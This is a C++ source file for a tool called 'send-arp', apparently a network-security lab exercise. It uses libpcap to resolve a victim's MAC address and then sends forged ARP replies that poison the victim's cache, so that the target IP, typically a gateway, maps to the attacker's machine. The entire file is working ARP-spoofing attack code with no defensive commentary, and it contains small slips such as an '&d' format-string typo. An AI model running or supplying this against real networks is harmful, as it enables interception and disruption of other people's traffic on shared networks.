#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <array>
#include <string>
#include <fstream>
#include <regex>
#include <iostream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#define MAC_ADDR_LEN 6

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_mac_address(const string& if_name, uint8_t* mac_addr_buf) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        cerr << "Fail : socket" << endl;
        return false;
    }
    strncpy(ifr.ifr_name, if_name.c_str(), IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
        cerr << "Fail : get MAC address" << endl;
        close(sock);
        return false;
    }
    close(sock);
    memcpy(mac_addr_buf, ifr.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
    return true;
}

void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const Ip targetIp, Mac& saveMac) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(myIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "%s", pcap_geterr(handle));
        exit(EXIT_FAILURE);
        return;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* replyPacket;

        res = pcap_next_ex(handle, &header, &replyPacket);
        if (res == 0) {
            continue;
        } else if (res < 0) {
            fprintf(stderr, "%s", pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }

        EthArpPacket* receivedPacket = (EthArpPacket*)replyPacket;

        if (ntohs(receivedPacket->eth_.type_) == EthHdr::Arp &&
            ntohs(receivedPacket->arp_.op_) == ArpHdr::Reply &&
            ntohl(receivedPacket->arp_.sip_) == static_cast<uint32_t>(targetIp) &&
            ntohl(receivedPacket->arp_.tip_) == static_cast<uint32_t>(myIp)) {

            saveMac = receivedPacket->arp_.smac_;
            return;
        }
    }

    fprintf(stderr, "Fail");
}

void send_arp_attack_packet(pcap_t* handle, const Ip& sender_ip, const Ip& target_ip, const Mac& my_mac) {
    Mac sender_mac;
    getMacAddrFromSendArp(handle, target_ip, my_mac, sender_ip, sender_mac);

    if (sender_mac == Mac("00:00:00:00:00:00")) {
        fprintf(stderr, "%s", std::string(sender_ip).c_str());
        return;
    }

    EthArpPacket packet;
    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "&d, %s", res, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }
    printf("%s, %s, %s", 
            std::string(sender_ip).c_str(), std::string(target_ip).c_str(), std::string(my_mac).c_str());
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    string dev_str = string(dev);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "%s(%s)", dev, errbuf);
        return -1;
    }

    uint8_t my_mac[MAC_ADDR_LEN];
    if (!get_mac_address(dev_str, my_mac)) {
        cerr << "Fail : MAC address" << dev_str << endl;
        return -1;
    }

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);

        send_arp_attack_packet(handle, sender_ip, target_ip, Mac(my_mac));
        printf("%s, %s", argv[i], argv[i + 1]);
    }

    pcap_close(handle);
    return 0;
}
